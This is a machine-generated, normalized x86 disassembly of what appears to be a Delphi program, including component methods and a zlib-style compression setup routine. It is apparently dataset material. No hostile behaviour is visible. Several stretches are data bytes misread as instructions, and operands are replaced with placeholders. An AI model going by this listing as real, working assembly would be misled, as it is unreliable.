mov ebp esp
xor eax eax
push ebp
push sub_461a60
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461a67
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404a30
sub_461a94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_461ab9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ac0
retn
sub_461acc
sbb [ ebx ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x461b ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6400461b ] al
add [ eax ] al
add [ esi + edx - 0x5e63ffba ] bl
inc ecx
add [ esp + esi - 0x650fffc0 ] ch
inc ecx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + ebx + 0x45e40046 ] bh
inc ecx
add [ ebp + ebx * 4 + 0x45000041 ] ah
inc ecx
add [ eax + 0x1d ] cl
inc esi
add ah dh
sbb [ esi ] al
mov [ esi - 0x607bffbf ] ds
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + ebx + 0x46 ] bh
add [ ecx + ebx ] bl
inc esi
add [ eax ] dh
sbb [ esi ] eax
inc eax
sbb [ esi ] eax
push esp
sbb [ esi ] eax
and [ esi + eax * 2 ] bl
add ah ch
sbb al 0x46
add [ eax + 0x1d ] bl
inc esi
add [ eax ] bl
pop ds
inc esi
add [ esp + ebx ] bl
inc esi
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x1d540040 ] cl
inc esi
add al bl
and [ esi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc edx
popad
jae r-xdata
push esp
imul ebp [ ebp + 0x65 ] r-xdata
bound eax [ eax ]
add bh bh
bound eax [ eax ]
add bh bh
nop
nop
sbb eax [ esi ]
pop es
or dl [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc edx
popad
jae r-xdata
je r-xdata
popad
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or edx [ edx + 0x65 ]
jo r-xdata
sbb [ ebx ] bl
inc esi
add [ eax + 0x17 ] dl
inc esi
add [ ecx ] cl
add [ ecx ] cl
dec ecx
dec esp
outsd
inc edx
popad
jae r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_461858
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x62 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
arpl [ ebp + 0x43 ] sp
push edx
dec esp
inc esi
nop
retn
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ edi ] al
dec esp
outsd
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_461c20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_461c70
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461c77
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
call sub_461834
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
sub_461c7c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_461858
mov [ esi + 0x61 ] 0x1
mov [ esi + 0x62 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_461cbc
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_461cec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_461d3c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d43
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax ebx
call sub_461814
sub_461d58
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461ee2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ee9
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403fcc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
mov edx esi
mov eax ebx
call sub_461894
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41642c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_461eb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx esi
mov eax [ ebp - 0xc ]
call sub_415e38
lea eax [ ebp - 0x8 ]
call sub_403fa8
cmp [ ebx + 0x61 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x4 ]
call sub_404040
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_4099ec
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x8 ]
call sub_40a624
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cbb8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_404040
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cbb8
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_404040
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cbb8
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_404040
sub_461f0f
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4620a2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4620a9
lea eax [ ebp - 0x24 ]
mov edx 0x6
call sub_403fcc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
mov edx esi
mov eax ebx
call sub_4618c4
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41642c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_462073
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx esi
mov eax [ ebp - 0xc ]
call sub_415e38
lea eax [ ebp - 0x8 ]
call sub_403fa8
cmp [ ebx + 0x61 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x4 ]
call sub_404040
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_4099ec
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x8 ]
call sub_40a624
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cbb8
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_404040
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cbb8
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_404040
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40cbb8
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x4 ]
call sub_404040
sub_4620cf
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add dh dh
inc eax
sbb al 0x2
je r-xdata
cmp dl [ eax + 0x60 ]
je r-xdata
mov [ eax + 0x63 ] dl
retn
retn
mov ecx edx
mov [ eax + 0x60 ] cl
test cl cl
je r-xdata
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx [ eax ]
call [ edx + 0x60 ]
jmp r-xdata
sub_462100
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462125
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46212c
retn
sub_462161
sbb al [ esi ]
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + ebx + 0x45e40046 ] bh
inc ecx
add [ ebp + ebx * 4 + 0x45000041 ] ah
inc ecx
add [ eax + 0x1d ] cl
inc esi
add ah dh
sbb [ esi ] al
mov [ esi - 0x607bffbf ] ds
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + ebx + 0x46 ] bh
add [ ecx + ebx ] bl
inc esi
add [ eax ] dh
sbb [ esi ] eax
inc eax
sbb [ esi ] eax
push esp
sbb [ esi ] eax
and [ esi + eax * 2 ] bl
add ah ch
sbb al 0x46
add [ eax + 0x1d ] bl
inc esi
add [ eax ] bl
pop ds
inc esi
add [ eax + 0x22 ] ah
inc esi
add [ ebx + 0x226c0046 ] dl
inc esi
add [ eax ] al
and eax [ esi ]
adc [ esi + eax * 2 ] ah
add al bl
and [ esi ] al
cwde
and al 0x46
add [ eax + 0x24 ] ch
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x6f ] bh
inc eax
add [ eax ] ch
add [ eax ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc esi
imul ebp [ ebp - 0x73 ] 0x22180040
inc esi
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
dec esp
outsd
inc esi
imul ebp [ ebp - 0x7c ] 0x8c004621
sbb eax [ esi ]
or al [ eax ]
or [ ecx + 0x64 ] ecx
dec esp
outsd
inc esi
imul ebp [ ebp + 0x1 ] 0x406f7800
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080009 ] al
imul ebp [ ebp + 0x6e ] 0x8d656d61
inc eax
add [ ebx - 0x17179340 ] al
scasd [ edi ]
cli
inc ebx
lea eax [ eax ]
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4622d8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
push [ ebp - 0x8 ]
push esi
push r-xdata
push edi
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_404328
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4622df
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_4622f7
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46236c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
push [ ebp - 0x8 ]
push esi
push r-xdata
push edi
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_404328
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462373
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_46238b
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ac#9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
push [ ebp - 0x8 ]
push esi
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404328
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4623fe
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_462407
inc [ edx ]
add [ eax ] al
add [ 0x5300000a ] cl
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x68 ]
call sub_40851c
test al al
jne r-xdata
push 0x22
mov ecx [ ebx + 0x68 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416050
mov esi eax
mov [ ebx + 0x6c ] esi
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415bbc
push 0xffff
mov ecx [ ebx + 0x68 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416050
mov [ ebx + 0x6c ] eax
jmp r-xdata
sub_462468
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404268
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404268
push eax
mov eax ebx
call sub_404468
mov edx eax
mov eax [ esi + 0x6c ]
pop ecx
call sub_415e00
sub_462498
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039ac#8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa8
lea eax [ ebp - 0x8 ]
call sub_403fa8
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
lea eax [ ebp - 0xc ]
push eax
mov edx edi
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408db8
cmp [ ebx + 0x62 ] 0x0
je r-xdata
call sub_4099ec
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40a624
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_4042b4
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404328
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462600
lea eax [ ebp - 0x28 ]
mov edx 0xa
call sub_403fcc
retn
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40cbb8
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_404040
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x20 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40cbb8
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0xc ]
call sub_404040
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x28 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_40cbb8
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0xc ]
call sub_404040
sub_462637
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_462665
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46266c
retn
sub_462678
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039ac#7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4626a4
retn
sub_4626f0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0xf
push 0x8
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
mov ecx 0x8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_462724
mov esp ebp
pop ebp
retn 0x4
sub_462724
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov edx [ ebp + 0xc ]
mov cl [ edx ]
cmp cl [ rw-data ]
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ ebp + 0x8 ] 0x38
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ edx + 0x18 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
jge r-xdata
mov [ ebp - 0x8 ] 0x6
cmp [ ebp + 0x14 ] 0x1
jl r-xdata
mov [ ebp - 0x14 ] 0x1
neg [ ebp + 0x18 ]
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x14 ] 0x9
jg r-xdata
cmp [ ebp - 0xc ] 0x8
jne r-xdata
cmp [ ebp + 0x18 ] 0x8
jl r-xdata
cmp [ ebp + 0x18 ] 0xf
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x8 ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
mov ecx 0x16b1
mov edx 0x1
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x1c ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x18 ]
mov [ ecx + 0x22 ] edx
mov edx 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x22 ]
mov eax [ ebp - 0x10 ]
shl edx cl
mov [ eax + 0x1e ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
mov ecx [ edx + 0x1e ]
dec ecx
mov [ eax + 0x26 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x14 ]
add edx 0x7
mov [ ecx + 0x42 ] edx
mov edx 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x42 ]
mov eax [ ebp - 0x10 ]
shl edx cl
mov [ eax + 0x3e ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
mov ecx [ edx + 0x3e ]
dec ecx
mov [ eax + 0x46 ] ecx
mov ecx 0x3
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x42 ]
xor edx edx
add eax 0x3
dec eax
div ecx
mov edx [ ebp - 0x10 ]
mov ecx 0x2
mov [ edx + 0x4a ] eax
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
mov edx [ eax + 0x1e ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov edx [ ebp - 0x10 ]
mov ecx 0x2
mov [ edx + 0x2a ] eax
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
mov edx [ eax + 0x1e ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov edx [ ebp - 0x10 ]
mov ecx 0x2
mov [ edx + 0x32 ] eax
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
mov edx [ eax + 0x3e ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x36 ] eax
mov eax 0x1
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x10 ]
add ecx 0x6
shl eax cl
mov [ edx + 0x168b ] eax
mov ecx 0x4
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
mov edx [ eax + 0x168b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x2a ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] rw-data
mov eax [ ebp - 0x4 ]
call sub_4631f4
mov eax 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x36 ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
mov ecx [ edx + 0x168b ]
shr ecx 0x1
add ecx ecx
add ecx [ ebp - 0x18 ]
mov [ eax + 0x1693 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
mov ecx [ edx + 0x168b ]
mov edx [ ebp - 0x10 ]
lea ecx [ ecx + ecx * 2 ]
add ecx [ eax + 0x8 ]
mov [ edx + 0x1687 ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x76 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x7a ] edx
mov edx [ ebp - 0x10 ]
mov al [ ebp - 0xc ]
mov [ edx + 0x19 ] al
mov eax [ ebp - 0x4 ]
call sub_462b80
sub_4629cc
add esp 0xffffffe4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor edx edx
mov eax [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] edx
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
add esp 0x1c
retn
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1c ]
cmp [ edx + 0x4 ] 0x2a
je r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ esp + 0xc ] ecx
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
call sub_468540
mov edx [ esp ]
mov [ edx + 0x30 ] eax
cmp [ esp + 0x10 ] 0x3
jae r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ecx + 0x1e ]
sub eax 0x106
cmp eax [ esp + 0x10 ]
jae r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp + 0x10 ]
push edx
mov ecx [ esp + 0x8 ]
push ecx
mov eax [ esp + 0x14 ]
mov edx [ eax + 0x2a ]
push edx
call sub_4626c8
add esp 0xc
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax + 0x5e ] ecx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov [ ecx + 0x4e ] edx
xor ecx ecx
mov eax [ esp + 0xc ]
mov edx [ eax + 0x2a ]
mov eax [ esp + 0xc ]
mov cl [ edx ]
mov [ eax + 0x3a ] ecx
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov ecx [ edx + 0x4a ]
mov edx [ eax + 0x3a ]
shl edx cl
mov ecx [ esp + 0xc ]
mov eax [ ecx + 0x2a ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ esp + 0xc ]
xor edx ecx
mov ecx [ esp + 0xc ]
and edx [ eax + 0x46 ]
mov [ ecx + 0x3a ] edx
xor edx edx
mov [ esp + 0x14 ] edx
jmp r-xdata
mov edx [ esp + 0xc ]
mov ecx [ edx + 0x1e ]
sub ecx 0x106
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x8 ]
sub eax [ esp + 0x10 ]
add [ esp + 0x4 ] eax
mov edx [ esp + 0x10 ]
sub edx 0x3
cmp edx [ esp + 0x14 ]
jae r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x4a ]
mov eax [ edx + 0x3a ]
shl eax cl
mov edx [ esp + 0xc ]
mov ecx [ edx + 0x2a ]
mov edx [ esp + 0x14 ]
movzx ecx [ ecx + edx + 0x2 ]
mov edx [ esp + 0xc ]
xor eax ecx
mov ecx [ esp + 0xc ]
and eax [ edx + 0x46 ]
mov [ ecx + 0x3a ] eax
